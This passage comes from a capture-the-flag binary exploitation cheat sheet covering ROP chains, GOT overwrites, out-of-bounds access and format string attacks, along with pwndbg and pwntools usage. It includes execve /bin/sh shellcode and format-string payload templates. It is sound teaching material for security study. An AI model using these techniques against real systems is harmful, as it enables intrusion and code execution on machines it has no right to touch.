fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</pre></table></code></div></div></ul></ol><hr /><h4 id="-example-on-x86"><span class="me-2">ğŸ“Œ Example on x86</span><a href="#-example-on-x86" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Attack procedure on x86 may include:</p><ol><li>Send data into writable area such as <code class="language-plaintext highlighter-rouge">/bin/sh</code>: <code class="language-plaintext highlighter-rouge">read(0, writableArea, len("/bin/sh"))</code><li>Print address of read_got: <code class="language-plaintext highlighter-rouge">write(1, read_got, len(str(read_got)))</code><li>Read new address from read_got: <code class="language-plaintext highlighter-rouge">read(0, read_got, len(str(read_got)))</code><li>Call system with writableArea containing â€œ/bin/shâ€: <code class="language-plaintext highlighter-rouge">system(writableArea)</code></ol><h3 id="-out-of-bounds"><span class="me-2">ğŸ“ OUT OF BOUNDS</span><a href="#-out-of-bounds" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><p><strong>Out of Bounds (OOB):</strong> Occurs when array index is negative or exceeds array length</p><p>=&gt; <strong>Leak/overwrite</strong> memory.</p><li><p><strong>Accessing array element:</strong></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&amp;</span><span class="n">arr</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">arr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">elem</span><span class="p">)</span> <span class="o">*</span> <span class="n">k</span>
</pre></table></code></div></div></ul><h3 id="-format-string-vulnerability-fsb"><span class="me-2">ğŸ”  FORMAT STRING VULNERABILITY (FSB)</span><a href="#-format-string-vulnerability-fsb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="how-printf-works"><span class="me-2">How <code class="language-plaintext highlighter-rouge">printf</code> Works</span><a href="#how-printf-works" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong><code class="language-plaintext highlighter-rouge">printf("%s", input)</code></strong>: Prints the string passed in <code class="language-plaintext highlighter-rouge">input</code>.<li><strong><code class="language-plaintext highlighter-rouge">printf("%s")</code></strong>: If no argument, prints the value at the first address on the stack.</ul><h4 id="parameter-specification-with-"><span class="me-2">Parameter Specification with <code class="language-plaintext highlighter-rouge">$</code></span><a href="#parameter-specification-with-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong><code class="language-plaintext highlighter-rouge">printf("%30$s")</code></strong>: Prints the value of the 30th argument on the stack.<li><strong><code class="language-plaintext highlighter-rouge">printf("%6$p")</code></strong>: Prints the address (in hex with <code class="language-plaintext highlighter-rouge">0x</code>) of the 6th argument on the stack.<li><strong><code class="language-plaintext highlighter-rouge">printf("%6$x")</code></strong>: Prints the hex value of the 6th argument on the stack, without <code class="language-plaintext highlighter-rouge">0x</code>.</ul><h4 id="applications-of-format-string"><span class="me-2">Applications of Format String</span><a href="#applications-of-format-string" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>Information leak:</strong><br /> Use format specifiers like <code class="language-plaintext highlighter-rouge">%p</code>, <code class="language-plaintext highlighter-rouge">%x</code>, <code class="language-plaintext highlighter-rouge">%d</code>, <code class="language-plaintext highlighter-rouge">%*n</code> to leak values on the stack (addresses, numbers, â€¦).<li><strong>Read memory:</strong><br /> Use <code class="language-plaintext highlighter-rouge">%s</code> to print a string at the address referenced from the stack (e.g.: read flag).<li><strong>Overwrite memory:</strong><br /> Use <code class="language-plaintext highlighter-rouge">%n</code>, <code class="language-plaintext highlighter-rouge">%hn</code>, <code class="language-plaintext highlighter-rouge">%hhn</code> to write the number of printed characters to a specific address, allowing modification of variables in memory.</ul><h4 id="difference-between-32-bit-and-64-bit"><span class="me-2">Difference between 32-bit and 64-bit</span><a href="#difference-between-32-bit-and-64-bit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li><strong>32-bit:</strong> Arguments are usually printed directly from the stack.<li><strong>64-bit:</strong><ul><li>First 5 arguments are passed via registers: <code class="language-plaintext highlighter-rouge">rsi</code>, <code class="language-plaintext highlighter-rouge">rdx</code>, <code class="language-plaintext highlighter-rouge">rcx</code>, <code class="language-plaintext highlighter-rouge">r8</code>, <code class="language-plaintext highlighter-rouge">r9</code>.<li>From the 6th argument onward, values are taken from the stack (e.g.: <code class="language-plaintext highlighter-rouge">rsp</code>, <code class="language-plaintext highlighter-rouge">rsp+0x8</code>, <code class="language-plaintext highlighter-rouge">rsp+0x10</code>, <code class="language-plaintext highlighter-rouge">rsp+0x18</code>).</ul></ul><h2 id="-pwndbg"><span class="me-2">ğŸ Pwndbg</span><a href="#-pwndbg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://github.com/pwndbg/pwndbg">Pwndbg</a> is an extension for GDB that provides many useful commands for analyzing and exploiting binaries.</p><p><a href="https://pwndbg.re/pwndbg/latest/reference/pwndbg/">Documentation</a> pwndbg reference</p><hr /><h3 id="-some-useful-commands"><span class="me-2">ğŸ” Some useful commands</span><a href="#-some-useful-commands" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><p><strong><code class="language-plaintext highlighter-rouge">checksec</code></strong>: show security features of the binary:</p><ul><li><strong>Canary:</strong> anti buffer overflow (often set at <code class="language-plaintext highlighter-rouge">[rbp-0x8]</code>).<li><strong>NX (Non-Executable):</strong> prevents execution of shellcode on the stack.<li><strong>PIE (Position Independent Executable):</strong> Binary is loaded at a random address.<li><strong>RELRO (RELocation Read-Only):</strong> Checks the protection feature of the address table (GOT). (anti GOT overwrite)</ul><li><p><strong><code class="language-plaintext highlighter-rouge">start</code></strong>: run the program and stop right at the beginning of the <code class="language-plaintext highlighter-rouge">main</code> function, helping you quickly start debugging.</p><li><p><strong><code class="language-plaintext highlighter-rouge">disass &lt;func&gt;</code> (disassemble):</strong> disassemble the specified function.</p><li><p><strong><code class="language-plaintext highlighter-rouge">vmmap</code></strong>: show virtual memory map of the process, including regions: stack, heap, libraries, and other segments, also displays their permissions, size, offsets and file paths.</p><li><p><strong><code class="language-plaintext highlighter-rouge">run</code></strong>: execute the program from the beginning.</p><li><p><strong><code class="language-plaintext highlighter-rouge">b *&lt;address&gt;</code> (break):</strong> set a breakpoint at a specific address.</p><ul><li><em>Ex:</em> <code class="language-plaintext highlighter-rouge">b *0x400123</code></ul><li><p><strong><code class="language-plaintext highlighter-rouge">del &lt;breakpoint&gt;</code> (delete):</strong> delete the specified breakpoint.</p><li><p><strong><code class="language-plaintext highlighter-rouge">c</code> (continue):</strong> continue executing the program until the next breakpoint or when the program stops.</p><li><p><strong><code class="language-plaintext highlighter-rouge">finish</code></strong>: continue executing until the current function ends.</p><li><p><strong><code class="language-plaintext highlighter-rouge">si</code> (step into):</strong> execute the next instruction and step into any functions (if present).</p><li><p><strong><code class="language-plaintext highlighter-rouge">ni</code> (next instruction):</strong> execute the next instruction but do <strong>not</strong> step into any functions.</p><li><p><strong><code class="language-plaintext highlighter-rouge">i</code> (info):</strong> show information about the program state, for example:</p><ul><li><code class="language-plaintext highlighter-rouge">i r</code> (info registers): Information about the registers.<li><code class="language-plaintext highlighter-rouge">i b</code> (info breakpoints): List of breakpoints.</ul><li><p><strong><code class="language-plaintext highlighter-rouge">k</code> (kill):</strong> kill the debugging process.</p><li><p><strong><code class="language-plaintext highlighter-rouge">bt</code> (backtrace):</strong> show the call stack at the time of stopping.</p><li><p><strong><code class="language-plaintext highlighter-rouge">x</code> (examine):</strong> examine memory at a specific address.</p><ul><li>Form: <code class="language-plaintext highlighter-rouge">x/&lt;count&gt;&lt;format&gt; &lt;address&gt;</code></ul><div class="table-wrapper"><table><thead><tr><th>Format<th>Size<tbody><tr><td><code class="language-plaintext highlighter-rouge">x</code> (hexadecimal)<td><code class="language-plaintext highlighter-rouge">b</code> (Byte, 1 byte)<tr><td><code class="language-plaintext highlighter-rouge">o</code> (octal)<td><code class="language-plaintext highlighter-rouge">h</code> (Halfword, 2 bytes)<tr><td><code class="language-plaintext highlighter-rouge">d</code> (decimal)<td><code class="language-plaintext highlighter-rouge">w</code> (Word, 4 bytes)<tr><td><code class="language-plaintext highlighter-rouge">u</code> (unsigned decimal)<td><code class="language-plaintext highlighter-rouge">g</code> (Giant, 8 bytes)<tr><td><code class="language-plaintext highlighter-rouge">s</code> (string)<td>Â <tr><td><code class="language-plaintext highlighter-rouge">t</code> (binary)<td>Â <tr><td><code class="language-plaintext highlighter-rouge">f</code> (float)<td>Â <tr><td><code class="language-plaintext highlighter-rouge">a</code> (address)<td>Â <tr><td><code class="language-plaintext highlighter-rouge">c</code> (character)<td>Â <tr><td><code class="language-plaintext highlighter-rouge">i</code> (instruction)<td>Â </table></div><ul><li><em>Ex:</em> <code class="language-plaintext highlighter-rouge">x/10wx 0x601000</code> shows 10 words in hex format from address <code class="language-plaintext highlighter-rouge">0x601000</code>.</ul><li><p><strong><code class="language-plaintext highlighter-rouge">tel</code> (telescope):</strong> show memory around the current instruction pointer, recursively explores addresses referenced by the memory to display their values. Ex:</p><ul><li><p><code class="language-plaintext highlighter-rouge">tel 0x123456 5</code> shows 5 lines of memory starting from address <code class="language-plaintext highlighter-rouge">0x123456</code>.</p><li><p><code class="language-plaintext highlighter-rouge">tel $rsp</code> shows memory around the stack pointer.</p></ul><li><p><strong><code class="language-plaintext highlighter-rouge">context</code>:</strong> show an overview of the current state of the process, including registers, stack, and disassembly around the current address.</p><li><p><strong><code class="language-plaintext highlighter-rouge">heap</code>:</strong> show detailed information about the heap, assisting in the analysis of heap-related vulnerabilities.</p><li><p><strong><code class="language-plaintext highlighter-rouge">vis_heap_chunks</code>:</strong> visualize heap chunks, showing their metadata and contents.</p><li><p><strong><code class="language-plaintext highlighter-rouge">search</code>:</strong> search for a string or byte sequence in memory.</p><ul><li><em>Ex:</em> <code class="language-plaintext highlighter-rouge">search "flag"</code> will find all locations containing the string <code class="language-plaintext highlighter-rouge">"flag"</code>.</ul><li><p><strong><code class="language-plaintext highlighter-rouge">p &amp;&lt;variable&gt;</code> (print):</strong> print the address of a specific variable.</p><ul><li><em>Ex:</em> <code class="language-plaintext highlighter-rouge">p &amp;0x601000</code> will print the value at address <code class="language-plaintext highlighter-rouge">0x601000</code>.</ul><li><p><strong><code class="language-plaintext highlighter-rouge">pattern_create</code></strong> and <strong><code class="language-plaintext highlighter-rouge">pattern_offset</code></strong></p><ul><li>Useful for creating and analyzing pattern strings (cyclic patterns) to find offsets during exploitation:<ul><li><code class="language-plaintext highlighter-rouge">pattern_create 100</code>: Create a pattern with 100 bytes.<li><code class="language-plaintext highlighter-rouge">pattern_offset &lt;value&gt;</code>: Determine the position of the <code class="language-plaintext highlighter-rouge">&lt;value&gt;</code> in the pattern.</ul></ul><li><p><strong><code class="language-plaintext highlighter-rouge">set detach-on-fork off</code></strong>: tells GDB to not detach from the other processes after program calls <code class="language-plaintext highlighter-rouge">fork()/vfork()</code>. Both parent and child processes will stay under GDB as separate inferiors.</p><ul><li><strong><code class="language-plaintext highlighter-rouge">set follow-fork-mode child/parent</code></strong>: process that GDB will follow after a fork.<li><strong><code class="language-plaintext highlighter-rouge">info inferiors</code></strong>: list tracked processes.<li><strong><code class="language-plaintext highlighter-rouge">inferior &lt;id&gt;</code></strong>: switch to a specific inferior process.</ul></ul><h2 id="-pwntools"><span class="me-2">ğŸ§° Pwntools</span><a href="#-pwntools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://github.com/Gallopsled/pwntools">PwnTools</a> is a powerful library that supports binary exploitation and automation. Here are some basic commands and techniques:</p><hr /><h4 id="-process--remote"><span class="me-2">ğŸ”¹ Process &amp; Remote</span><a href="#-process--remote" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Start a local process
</span><span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./filename</span><span class="sh">'</span><span class="p">)</span>        <span class="c1"># Local binary
</span>
<span class="c1"># Connect to remote server
</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">address</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>      <span class="c1"># Remote server
</span>
<span class="c1"># Attach gdb for debugging (with pwntools API)
</span><span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="sh">'''</span><span class="s">pwndbg_script</span><span class="sh">'''</span><span class="p">)</span>
</pre></table></code></div></div><h4 id="-elf--libc"><span class="me-2">ğŸ”¹ ELF &amp; Libc</span><a href="#-elf--libc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c1"># Load binary and libc
</span><span class="n">e</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./filename</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># Get address from PLT (Procedure Linkage Table)
</span><span class="n">plt_addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">funcname</span><span class="sh">'</span><span class="p">]</span>

<span class="c1"># Get address from GOT (Global Offset Table)
</span><span class="n">got_addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">funcname</span><span class="sh">'</span><span class="p">]</span>

<span class="c1"># Get offset of function in binary
</span><span class="n">func_offset</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">funcname</span><span class="sh">'</span><span class="p">]</span>

<span class="c1"># Get offset of function in libc (note: symbol name must be exact)
</span><span class="n">libc_func_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">funcname</span><span class="sh">'</span><span class="p">]</span>

<span class="c1"># Find location of "/bin/sh" string in libc
</span><span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</pre></table></code></div></div><h4 id="-packing--unpacking"><span class="me-2">ğŸ”¹ Packing &amp; Unpacking</span><a href="#-packing--unpacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c1"># Convert number to little-endian byte string (64-bit and 32-bit)
</span><span class="n">packed_64</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">packed_32</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>

<span class="c1"># Unpack byte string to integer (64-bit and 32-bit)
</span><span class="n">number_64</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xef\xbe\xad\xde\x00\x00\x00\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">number_32</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xef\xbe\xad\xde</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><h4 id="-sending-and-receiving-data"><span class="me-2">ğŸ”¹ Sending and receiving data</span><a href="#-sending-and-receiving-data" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c1"># Send data
</span><span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>                      <span class="c1"># Send 1 byte 'A'
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>                  <span class="c1"># Send 'A' + '\n'
</span>
<span class="c1"># Send data after receiving prompt
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">hello</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">hello</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#send and sendline
</span><span class="n">send</span><span class="p">:</span> <span class="n">read</span>
<span class="n">sendline</span><span class="p">:</span> <span class="n">scanf</span><span class="p">,</span> <span class="n">gets</span><span class="p">,</span> <span class="n">fgets</span>

<span class="c1"># Receive data
</span><span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>               <span class="c1"># Receive up to 1024 bytes
</span><span class="n">line</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>               <span class="c1"># Receive until newline
</span><span class="n">exact</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                <span class="c1"># Receive exactly 5 bytes
</span><span class="n">until</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">hello</span><span class="sh">'</span><span class="p">)</span>     <span class="c1"># Receive until 'hello' is found
</span><span class="n">all_data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvall</span><span class="p">()</span>            <span class="c1"># Receive all data until process ends
</span></pre></table></code></div></div><h4 id="-shellcode-1"><span class="me-2">ğŸ”¹ Shellcode</span><a href="#-shellcode-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c1"># Shellcode
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">''''</span><span class="s">
    ;write your shellcode here
    mov rax, 0x3b               ; syscall number for execve
    mov rdi, rsp                ; rdi = pointer to </span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="s">
    xor rsi, rsi                ; rsi = NULL
    xor rdx, rdx                ; rdx = NULL
    syscall
</span><span class="sh">'''</span><span class="p">)</span>
</pre></table></code></div></div><h4 id="-otherwise-use-pwntools-built-in-shellcode-generation"><span class="me-2">ğŸ”¹ Otherwise, use pwntools built-in shellcode generation:</span><a href="#-otherwise-use-pwntools-built-in-shellcode-generation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c1"># Spawn a shell (execve /bin/sh)
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">()</span>

<span class="c1"># Generate shellcode to read and print 'flag.txt'
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">readfile</span><span class="p">(</span><span class="sh">'</span><span class="s">flag.txt</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># Open, read and write
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">flag.txt</span><span class="sh">'</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>

<span class="c1">#Finnally, assemble the shellcode
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</pre></table></code></div></div><p>Visit <a href="https://docs.pwntools.com/en/stable/shellcraft.html">here</a> for more shellcode examples.</p><p>Remember to use <code class="language-plaintext highlighter-rouge">context.arch = 'amd64' or 'i386'</code> to set the architecture before generating shellcode.</p><h4 id="-format-string"><span class="me-2">ğŸ”¹ Format string</span><a href="#-format-string" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c1"># Write value to address using format string
</span><span class="nf">fmtstr_payload</span><span class="p">(</span>
    <span class="n">offset</span><span class="p">,</span>
    <span class="n">writes</span><span class="p">,</span>
    <span class="n">numbwritten</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">write_size</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sh">'</span><span class="s">byte</span><span class="sh">'</span><span class="p">,</span>
    <span class="n">write_size_max</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sh">'</span><span class="s">long</span><span class="sh">'</span><span class="p">,</span>
    <span class="n">overflows</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">16</span><span class="p">,</span>
    <span class="n">strategy</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sh">"</span><span class="s">small</span><span class="sh">"</span><span class="p">,</span>
    <span class="n">badbytes</span><span class="p">:</span> <span class="nb">frozenset</span> <span class="o">=</span> <span class="nf">frozenset</span><span class="p">(),</span>
    <span class="n">offset_bytes</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">no_dollars</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">False</span>
<span class="p">)</span>
<span class="c1">#Ex: write one_gadget to read_got
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5</span> <span class="c1"># Check in gdb
</span><span class="n">where</span>  <span class="o">=</span> <span class="n">read_got</span>
<span class="n">what</span>   <span class="o">=</span> <span class="n">one_gadget</span>
<span class="n">payload</span> <span class="o">=</span> <span class="nf">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="p">{</span> <span class="n">where</span><span class="p">:</span> <span class="n">what</span> <span class="p">})</span>
</pre></table></code></div></div><h4 id="-print--interactive"><span class="me-2">ğŸ”¹ Print &amp; Interactive</span><a href="#-print--interactive" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c1"># Print info to console
</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Useful info</span><span class="sh">"</span> <span class="o">+</span> <span class="n">info</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">Success info</span><span class="sh">"</span> <span class="o">+</span> <span class="n">info</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">warning</span><span class="p">(</span><span class="sh">"</span><span class="s">Warning info</span><span class="sh">"</span> <span class="o">+</span> <span class="n">info</span><span class="p">)</span>

<span class="c1"># Switch to interactive mode to interact directly with process
</span><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="other-commands-can-be-found-in-the-official-documentation--cheat-sheet"><span class="me-2">Other commands can be found in the <a href="https://docs.pwntools.com/en/stable/">official documentation</a> / <a href="https://gist.github.com/KnightChaser/e0ddb74278de522c6e2973d1ae8135e6">cheat sheet</a>.</span><a href="#other-commands-can-be-found-in-the-official-documentation--cheat-sheet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="-pwninit"><span class="me-2">ğŸ”— Pwninit</span><a href="#-pwninit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://github.com/io12/pwninit">Pwninit</a> is a tool for patching binaries with provided libc and loader.</p><hr /><p>Commands:</p><ul><li><code class="language-plaintext highlighter-rouge">pwninit</code>: auto patch file<li><code class="language-plaintext highlighter-rouge">mv file_patch file</code>: rename file</ul><h2 id="ï¸-other-useful-tools"><span class="me-2">ğŸ› ï¸ Other useful tools</span><a href="#ï¸-other-useful-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><p><a href="https://gchq.github.io/CyberChef/">CyberChef</a> : tool for analyzing and decoding data</p><li><p><a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">LinuxSyscallReference</a> : tool for looking up Linux syscalls and their parameters</p><li><p><a href="https://defuse.ca/online-x86-assembler.htm">Online Assembler/Disassembler</a> : tool for assembling and disassembling x86/x64</p><li><p><a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Shell-storm</a> : tool for converting.</p><li><p><a href="https://libc.rip/">Libc Database</a> : tool for searching libc versions based on leaked addresses</p></ul><h2 id="-learning-resources"><span class="me-2">ğŸ”° Learning resources</span><a href="#-learning-resources" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><p><a href="https://dreamhack.io/">Dream Hack</a>: basic system hacking</p><li><p><a href="https://www.youtube.com/@leonardo69696">Leonardo</a>, <a href="https://www.youtube.com/@JHTPwner">JHTPwner</a>: friendly beginner tutorials</p><li><p><a href="https://guyinatuxedo.github.io/">Nightmare</a>: resources + 